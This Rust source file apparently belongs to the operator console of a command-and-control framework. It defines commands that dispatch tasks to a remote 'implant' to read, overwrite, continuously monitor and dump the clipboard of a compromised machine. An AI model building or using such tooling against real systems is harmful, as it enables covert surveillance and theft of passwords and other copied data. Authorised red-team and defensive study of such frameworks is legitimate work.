//! Clipboard commands

use anyhow::Result;
use common::ImplantId;
use prost::Message;

use crate::cli::CliState;
use crate::display::{print_info, print_success};

/// Get current clipboard contents from the implant
pub async fn get(cli: &CliState) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    print_info("Getting clipboard contents...");
    let task = protocol::ClipboardTask {
        operation: Some(protocol::clipboard_task::Operation::Get(protocol::ClipboardGet {})),
    };
    let task_data = task.encode_to_vec();
    let task_id = cli.client.dispatch_task(implant_id, "clipboard", task_data).await?;
    print_success(&format!("Clipboard get task dispatched: {}", hex::encode(task_id.as_bytes())));
    print_info("Output will be available via 'jobs output'");

    Ok(())
}

/// Set clipboard contents on the implant
pub async fn set(cli: &CliState, text: &str) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    print_info(&format!("Setting clipboard to: {}", text));

    let task = protocol::ClipboardTask {
        operation: Some(protocol::clipboard_task::Operation::Set(protocol::ClipboardSet {
            text: text.to_string(),
        })),
    };
    let task_data = task.encode_to_vec();

    let task_id = cli.client.dispatch_task(implant_id, "clipboard", task_data).await?;
    print_success(&format!("Clipboard set task dispatched: {}", hex::encode(task_id.as_bytes())));

    Ok(())
}

/// Start monitoring clipboard for changes on the implant
pub async fn monitor(cli: &CliState) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    print_info("Starting clipboard monitor...");
    let task = protocol::ClipboardTask {
        operation: Some(protocol::clipboard_task::Operation::MonitorStart(protocol::ClipboardMonitorStart {
            max_entries: None,
            dedupe: None,
        })),
    };
    let task_data = task.encode_to_vec();
    let task_id = cli.client.dispatch_task(implant_id, "clipboard", task_data).await?;
    print_success(&format!("Clipboard monitor task dispatched: {}", hex::encode(task_id.as_bytes())));
    print_info("Use 'clipboard dump' to retrieve captured data");

    Ok(())
}

/// Stop monitoring clipboard on the implant
pub async fn stop(cli: &CliState) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    print_info("Stopping clipboard monitor...");
    let task = protocol::ClipboardTask {
        operation: Some(protocol::clipboard_task::Operation::MonitorStop(protocol::ClipboardMonitorStop {})),
    };
    let task_data = task.encode_to_vec();
    let task_id = cli.client.dispatch_task(implant_id, "clipboard", task_data).await?;
    print_success(&format!("Clipboard stop task dispatched: {}", hex::encode(task_id.as_bytes())));

    Ok(())
}

/// Dump buffered clipboard data captured during monitoring
pub async fn dump(cli: &CliState) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    print_info("Dumping clipboard buffer...");
    let task = protocol::ClipboardTask {
        operation: Some(protocol::clipboard_task::Operation::Dump(protocol::ClipboardDump {})),
    };
    let task_data = task.encode_to_vec();
    let task_id = cli.client.dispatch_task(implant_id, "clipboard", task_data).await?;
    print_success(&format!("Clipboard dump task dispatched: {}", hex::encode(task_id.as_bytes())));
    print_info("Output will be available via 'jobs output'");

    Ok(())
}
